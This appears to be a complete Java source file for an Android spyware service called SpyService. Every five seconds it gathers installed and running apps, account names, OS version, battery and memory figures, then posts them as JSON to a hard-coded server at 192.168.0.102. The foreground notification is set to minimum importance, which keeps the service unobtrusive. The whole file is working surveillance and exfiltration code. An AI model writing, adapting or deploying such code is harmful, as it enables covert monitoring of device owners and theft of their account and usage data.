package com.example.spyapp;

import android.accounts.AccountManager;
import android.app.*;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.BatteryManager;
import android.os.Build;
import android.os.IBinder;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.JobIntentService;
import androidx.core.app.NotificationCompat;
import com.google.gson.Gson;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.Request;
import okhttp3.RequestBody;
import org.json.JSONObject;
import org.json.JSONStringer;

import java.io.BufferedWriter;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.ScheduledThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.logging.Logger;
import java.util.stream.Collectors;

public class SpyService extends JobIntentService {
    private final Logger logger = Logger.getLogger(this.getClass().getName());
    private final ScheduledExecutorService executorService = new ScheduledThreadPoolExecutor(1);
    private static ScheduledFuture scheduledFuture;

    @Override
    public void onCreate() {
        super.onCreate();
        startMyOwnForeground();
    }

    private void startMyOwnForeground(){
        String NOTIFICATION_CHANNEL_ID = "com.example.spyapp";
        String channelName = "My Background Service";
        NotificationChannel channel = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_NONE);
        channel.setLightColor(Color.BLUE);
        channel.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);
        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        assert manager != null;
        manager.createNotificationChannel(channel);

        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID);
        Notification notification = notificationBuilder.setOngoing(true)
                .setSmallIcon(R.mipmap.ic_launcher_round)
                .setContentTitle("App is running in background")
                .setPriority(NotificationManager.IMPORTANCE_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
        startForeground(2, notification);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (scheduledFuture == null || scheduledFuture.isCancelled() || scheduledFuture.isDone()) {
            scheduledFuture = executorService.scheduleAtFixedRate(() -> {
                spyTask();
            }, 0, 5, TimeUnit.SECONDS);
            logger.info("service started.");
        } else {
            logger.info("service is already running");
        }
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (scheduledFuture != null) scheduledFuture.cancel(true);
        logger.info("task destroyed.");
    }

    @Override
    protected void onHandleWork(@NonNull Intent intent) {

    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void spyTask() {
        SpyModel spyModel = new SpyModel();
        logger.info("Task executed.");

        spyModel.setVersion(Build.VERSION.RELEASE);
        logger.info("Version: " + spyModel.getVersion());

        spyModel.setSdk(Build.VERSION.SDK_INT);
        logger.info("SDK: " + spyModel.getSdk());

        spyModel.setInstalled(getPackageManager().getInstalledApplications(PackageManager.GET_META_DATA).stream().filter(a -> a.name != null).map(a -> a.name).collect(Collectors.toList()));
        logger.info("Installed: " + spyModel.getInstalled());

        spyModel.setRunning(((ActivityManager) getSystemService(ACTIVITY_SERVICE)).getRunningAppProcesses().stream().filter(a -> a.processName != null).map(a -> a.processName).collect(Collectors.toList()));
        logger.info("Running: " + spyModel.getRunning());

        spyModel.setBattery(((BatteryManager)getSystemService(BATTERY_SERVICE)).getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY));
        logger.info("Battery: " + spyModel.getBattery());

        ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
        ((ActivityManager) getSystemService(ACTIVITY_SERVICE)).getMemoryInfo(memoryInfo);
        spyModel.setMemory(memoryInfo.availMem);
        logger.info("Memory: " + spyModel.getMemory());

        spyModel.setAccounts(Arrays.stream(AccountManager.get(this).getAccounts()).filter(a -> a.name != null).map(a -> a.name).collect(Collectors.toList()));
        logger.info("Accounts: " + spyModel.getAccounts());

        HttpURLConnection connection = null;
        try {
            connection = (HttpURLConnection) (new URL("http://192.168.0.102:8080/spy").openConnection());
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("Accept", "application/json");
            connection.setRequestMethod("POST");

            connection.setDoOutput(true);
            OutputStream stream = connection.getOutputStream();
            String body = new Gson().toJson(spyModel);
            stream.write(body.getBytes(StandardCharsets.UTF_8));
            stream.close();
            connection.connect();

            connection.getInputStream();

        } catch (Exception ex) {
            logger.info(ex.getMessage());
        } finally {
            connection.disconnect();
        }
    }
}
